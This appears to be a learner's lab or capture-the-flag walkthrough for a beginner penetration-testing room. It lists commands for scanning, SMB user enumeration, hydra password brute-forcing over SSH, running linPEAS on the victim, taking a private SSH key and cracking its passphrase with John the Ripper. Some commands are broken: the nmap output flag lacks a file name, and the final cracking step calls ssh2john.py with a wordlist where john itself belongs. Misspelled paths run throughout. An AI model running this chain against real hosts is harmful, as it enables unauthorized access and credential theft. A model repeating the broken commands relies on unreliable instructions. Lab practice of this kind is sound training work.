                        ##      Basic Pentration Testing 


#Task -1: Web app Testing and Privilege Escalation 

1 - Deploy machine and scan the the netwoek
$ nmap -sC -sV -oN <machine_ip>

2 - Brute-force the domain 
  $ gobuster -w /opt/DirBuster-0.12/dicrecotry-list-.2.3-mediu.txt -u <url>

3 - Brute-forcing to Find the user name and Password

  Let's try SMB to Enum Linux machine 
  $/opt/enum4linux/enum4linux.pl -a <machine_ip> | tee enum4linux.log       #this tee enum for save your result .log file
  Here you get all user/group

3 - Now find user Password with Hydra to connect with ssh
    $ hydra -l <userName> -P /opt/rockyou.txt ssh://<ip>

4 - Now Log into the machine <which user passowrd did you get>
    $ ssh <user>@<ip>

5 - Now Priliege Esclaton to user machine 
    Find the 
    To Enumerate the privilege Esc :Use LinPESS tool 
    To do run this tool you kali_machine not user_Victem machine 

    $scp /opt/linePEAS/linepeas.sh  <username>@<machine_ip>:/dev/shm
    
    Now Execute with your victem machine the linePEASE.sh permission $ chmod +x linepeas.sh
    Now run linepease.sh

    LinesPEASE show your alot infomation but there you got a: Private SSH keys 

    Then move to .ssh directory 
    $ ls -la to see private file id_rsa

    - Now see the file and copy  then make another rsa file and paste 
    - Then set permission to ONLY-REAS BY-US 
        $ chmod 600 <rsa_file>

    _ Now try to login with ssh 
      $ ssh -i <rsa_file> user@ip_addr
      Hmm, Here to asking for password but I don't have let's guess with (john ssh)

    - Cracking SSH_Jhon :Passowrd
        $ /opt/JohnTheRipper/run/ssh2john.py <id_rsa> 
        $ /opt/JohnTheRipper/run/ssh2john.py <id_rsa> > file.txt        #John will create his key for cracking
        Now the run which john has made file.txt
           $ /opt/JohnTheRipper/run/ssh2john.py file.txt --wordlist=/opt/rockyou.txt
           Now you got the password, and Now run the ssh@ which we have left for password 
           $ ssh -i <rsa> user@<ip-addr>

6 - Now login as root and read the password.bak file
